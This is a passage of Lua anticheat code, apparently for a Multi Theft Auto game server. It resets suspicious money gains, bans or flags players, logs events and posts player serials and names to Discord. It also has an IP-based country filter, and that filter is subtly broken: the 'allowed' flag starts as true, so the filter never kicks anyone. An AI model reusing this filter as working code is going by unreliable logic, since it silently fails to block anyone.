        EnviarMensagemDiscord(discord.moneycheat, "**[Money Cheat]**\n**Serial**: "..getPlayerSerial(player).."\n**Name**: "..getPlayerName(player).."\n**ID**: "..getElementData(player, servidor.id).."\n**Current Money**: "..dinheiroAtual.."\n**Old Money**: "..dinheiroAntigo.."\n**Difference**: "..dinheiroAtual - dinheiroAntigo.."")
        return 
    end
      if dinheiroAtual - dinheiroAntigo > ac.money.value then
        setPlayerMoney(player, dinheiroAntigo)
        if ac.bans.moneycheat then
            addBan(player, "moneycheat", false)
            outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo.."")
            else
            notifyStaff("[AC] "..getPlayerName(player).." ["..getElementData(player, servidor.id).."] "..getSystemLanguage("moneycheat"))
            outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo.."")
        end
        EnviarMensagemDiscord(discord.moneycheat, "**[Money Cheat]**\n**Serial**: "..getPlayerSerial(player).."\n**Name**: "..getPlayerName(player).."\n**ID**: "..getElementData(player, servidor.id).."\n**Current Money**: "..dinheiroAtual.."\n**Old Money**: "..dinheiroAntigo.."\n**Difference**: "..dinheiroAtual - dinheiroAntigo.."")
      end
end
addEventHandler("onPlayerMoneyChange", getRootElement(), verificaDinheiro)

function countryCheck(ipv4)
    if not outros.country.on then
        return
    end
    local url = 'https://api.country.is/'
    local allowed = true
    fetchRemote(url..ipv4, function(response, info)
        if info == 200 or info == 0 then
            local data = fromJSON(response)
            if data then
                for i, v in ipairs(outros.country.flags) do
                    if v == data.country then
                        allowed = true
                        break
                    end
                end
                if not allowed then
                    return kickPlayer(source, servidor.sigla.." Anticheat", getSystemLanguage("countrynotallowed")) 
                end
            end
        end
end)
end